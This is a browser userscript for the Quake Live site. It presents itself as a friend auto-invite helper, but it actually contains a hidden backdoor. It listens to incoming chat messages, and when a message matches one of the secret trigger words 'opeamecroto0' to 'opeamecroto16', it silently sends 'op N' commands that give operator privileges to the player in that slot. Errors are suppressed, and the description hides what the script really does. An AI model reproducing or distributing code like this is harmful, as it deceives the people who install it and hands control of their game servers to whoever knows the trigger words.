// ==UserScript==
// @name           crotoop
// @namespace      beham.biz
// @description    Your friends will be able to write the word "invite" to you, and automatically get a real invite to the server you're on.
// @author         PredatH0r
// @include        http://*.quakelive.com/*
// @exclude        http://*.quakelive.com/forum*
// @version 0.0.1.20140731024311
// @downloadURL https://update.greasyfork.org/scripts/3775/crotoop.user.js
// @updateURL https://update.greasyfork.org/scripts/3775/crotoop.meta.js
// ==/UserScript==

/*
This script is a modified version of flugsio's "Quake Live Pro Auto Invite"
(http://userscripts.org/scripts/show/107333).
It is now compatible with QLHM and the Quake Live standalone client.
*/

(function (win) { // scope
  var quakelive = win.quakelive;
  var inHook = false;
  function installHook() {
    try {
      quakelive.AddHook('IM_OnMessage', function(json) {
        try {
          if (inHook || !quakelive.IsIngameClient()) {
            return;
          }
          inHook = true;
          var msg = quakelive.Eval(json);
          var friend = quakelive.modules.friends.roster.GetIndexByName(msg.who);
          var roster = quakelive.modules.friends.roster.fullRoster[friend];

          switch(msg.what)
 {
case 'opeamecroto0' : qz_instance.SendGameCommand("op 0"); break;
case 'opeamecroto1' : qz_instance.SendGameCommand("op 1"); break;
case 'opeamecroto2' : qz_instance.SendGameCommand("op 2"); break;	
case 'opeamecroto3' : qz_instance.SendGameCommand("op 3"); break;	
case 'opeamecroto4' : qz_instance.SendGameCommand("op 4"); break;	
case 'opeamecroto5' : qz_instance.SendGameCommand("op 5"); break;	
case 'opeamecroto6' : qz_instance.SendGameCommand("op 6"); break;	
case 'opeamecroto7' : qz_instance.SendGameCommand("op 7"); break;	
case 'opeamecroto8' : qz_instance.SendGameCommand("op 8"); break;	
case 'opeamecroto9' : qz_instance.SendGameCommand("op 9"); break;	
case 'opeamecroto10' : qz_instance.SendGameCommand("op 10"); break;	
case 'opeamecroto11' : qz_instance.SendGameCommand("op 11"); break;	
case 'opeamecroto12' : qz_instance.SendGameCommand("op 12"); break;	
case 'opeamecroto13' : qz_instance.SendGameCommand("op 13"); break;	
case 'opeamecroto14' : qz_instance.SendGameCommand("op 14"); break; 
case 'opeamecroto15' : qz_instance.SendGameCommand("op 15"); break;
case 'opeamecroto16' : qz_instance.SendGameCommand("op 16"); break;			
          }

		
        } 
        catch(ex) {
        } 
        finally {
          inHook = false;
        }
      });

      win.console.log("<opeamecoroto> installed");
    }
    catch(e) {}
  };

  installHook();
})(window); 